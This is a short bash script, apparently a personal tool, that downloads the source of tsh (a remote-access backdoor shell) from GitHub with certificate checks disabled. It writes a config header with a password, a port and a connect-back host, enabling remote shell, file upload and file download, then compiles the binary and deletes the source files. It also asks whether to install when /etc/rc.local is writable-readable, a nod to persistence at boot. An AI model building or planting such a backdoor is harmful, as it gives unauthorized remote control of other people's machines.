#!/bin/bash
# Author : Exo-poulpe
# Description : Download and compile tsh shell (https://github.com/creaktive/tsh)
# Date : 2020.04.26

declare NAME
declare PORT
PORT=6453
declare PASSWORD
PASSWORD="password"
declare HOST
HOST="0.0.0.0"
declare STARTUP
STARTUP=0
declare WGET
declare GCC
declare CLIENT
declare INSTALL
INSTALL=0
declare REVERSE
REVERSE="N"


WGET=$(command -v wget);

if [[ "$WGET" == "" ]]; then
    echo -e "wget is not present";
    exit
else
    echo -e "wget is present";
fi

GCC=$(command -v gcc);
if [[ "$GCC" == "" ]]; then
    echo -e "gcc is not present";

    # Ask if you want dl prebuild binaries ?

    exit
else
    echo -e "gcc is present";
fi


# Create config
read -p "The local port of server bind (6453) ? " PORT

read -p "The password to use (password) ? " PASSWORD

read -p "The host for connecting (0.0.0.0) ? " HOST
if [[ "$HOST" == "" ]];then
    HOST="0.0.0.0"
fi


if [ -r /etc/rc.local ]; then
    read -p "You want try to install ? " INSTALL
fi


echo -e "PORT $PORT\n"
echo -e "Password $PASSWORD\n"
echo -e "HOST $HOST\n"

# Compile #
mkdir tshfold
cd tshfold
wget --no-check-certificate https://raw.githubusercontent.com/creaktive/tsh/master/Makefile
wget --no-check-certificate https://raw.githubusercontent.com/creaktive/tsh/master/aes.c
wget --no-check-certificate https://raw.githubusercontent.com/creaktive/tsh/master/aes.h
wget --no-check-certificate https://raw.githubusercontent.com/creaktive/tsh/master/sha1.h
wget --no-check-certificate https://raw.githubusercontent.com/creaktive/tsh/master/sha1.c
wget --no-check-certificate https://raw.githubusercontent.com/creaktive/tsh/master/pel.h
wget --no-check-certificate https://raw.githubusercontent.com/creaktive/tsh/master/pel.c
wget --no-check-certificate https://raw.githubusercontent.com/creaktive/tsh/master/tsh.c
wget --no-check-certificate https://raw.githubusercontent.com/creaktive/tsh/master/tsh.h
wget --no-check-certificate https://raw.githubusercontent.com/creaktive/tsh/master/tshd.c


echo -e "
#ifndef _TSH_H
#define _TSH_H

char *secret = \"$PASSWORD\";
char *cb_host = NULL;

#define SERVER_PORT $PORT
short int server_port = SERVER_PORT;

#define CONNECT_BACK_HOST  \"$HOST\"
#define CONNECT_BACK_DELAY 5

#define GET_FILE 1
#define PUT_FILE 2
#define RUNSHELL 3

#endif /* tsh.h */" > tsh.h


make linux



# Clean #
rm *.c
rm *.h





